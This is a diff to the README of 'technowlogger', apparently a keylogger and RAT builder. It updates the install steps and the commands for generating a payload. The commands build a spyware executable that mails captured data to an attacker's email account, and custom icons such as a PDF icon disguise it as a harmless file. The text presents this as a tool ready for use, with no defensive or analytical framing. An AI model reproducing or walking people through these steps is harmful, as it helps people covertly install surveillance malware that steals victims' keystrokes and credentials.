@@ -84,11 +84,16 @@ $ cd technowlogger
 # Installing dependencies
 $ bash installer_linux.sh
 
+*** Note When The Python Installer DialogBox Appear while executing installer_linux.sh ***
+    * Click on custom install 
+    * Select Path to : C:/Python37-32
+    ### So that the python is installed in this path (Inside Wine) : ~/.wine/drive_c/Python37-32
+
 $ chmod +x technowgen.py
-$ ./technowgen.py  --help    or   python technowgen.py --help
+$ python3 technowgen.py --help
 
 # Making Payload/RAT
-$ python technowgen.py -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path
+$ python3 technowgen.py -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path
 
 Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
 ```
